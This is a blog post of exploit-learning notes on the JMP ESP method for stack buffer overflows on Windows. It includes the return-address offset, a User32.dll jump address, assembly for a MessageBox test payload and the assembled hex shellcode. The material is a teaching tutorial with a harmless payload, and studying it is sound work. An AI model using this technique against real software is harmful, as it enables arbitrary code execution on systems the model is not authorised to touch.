---
title: Exploit Learning Notes 002 JMP ESP
description: ShellCode's Dynamic Positioning Method - JMP ESP Method
date: 2020-10-19 18:20:00+0800
categories:
    - Exploit
tags:
    - Windows
    - ShellCode
---

> [Click here to download this article with executable program, shellcode file](exploit-study-02.zip)

Source: [Moeomu's blog](/posts/exploit-learning-notes-002-jmp-esp/)

## Stack space shifting

ShellCode is often dynamic in memory and is not directly filled with a fixed value  
That is, the stack space address of the buffer array in the previous article is not always a fixed value  
When the CPU executes to this address, it may trigger an invalid instruction exception and crash the program and ShellCode will not run.

### Principle

Find the address of a `JMP ESP` instruction from the loaded system DLL and use this address to flood the return address  
This allows for precise location of the shellcode and adapts to the dynamic changes in the stack space  
The stack address is small and large, the CPU execution order is from small address to large address, stack flooding is also from small address to large address  
This allows ShellCode to be dynamically addressed by flooding the previous section with meaningless data and flooding the start of ShellCode at `[ESP]`.

### ShellCode writing

#### structure

Useless data + `JMP ESP` address (this address is exactly flooded to the function return address) + command code (for testing, MessageBox popup)

> Description.
>
> - `retn` will jump to `JMP ESP` afterwards, then ESP + 4
> - `JMP ESP` will jump to the command code exactly after

#### necessary data

- `JMP ESP` address: located in User32.dll `0x77D29353` (no need to be the original command, just search the binary `0xFFE4`)
- Garbage data size: 52 Byte = Buffer(44 Byte) + authenticated(4 Byte) + EBP(4 Byte)

#### Final Code

> Here is the command code to be executed

```x86asm
33DB                      xor ebx,ebx
53                        push ebx
68 6D756F6F               push 0x6F6F756D
68 4D6F656F               push 0x6F656F4D
8BC4                      mov eax,esp
53                        push ebx
50                        push eax
50                        push eax
53                        push ebx
B8 EA07D577               mov eax,user32.MessageBoxA
FFD0                      call eax
B8 FACA817C               mov eax,kernel32.ExitProcess
FFD0                      call eax
```

> Final ShellCode

```c
34 33 32 31 34 33 32 31  34 33 32 31 34 33 32 31
34 33 32 31 34 33 32 31  34 33 32 31 34 33 32 31
34 33 32 31 34 33 32 31  34 33 32 31 34 33 32 31
34 33 32 31 53 93 D2 77  33 DB 53 68 6D 75 6F 6F
68 4D 6F 65 6F 8B C4 53  50 50 53 B8 EA 07 D5 77
FF D0 B8 FA CA 81 7C FF  D0
```
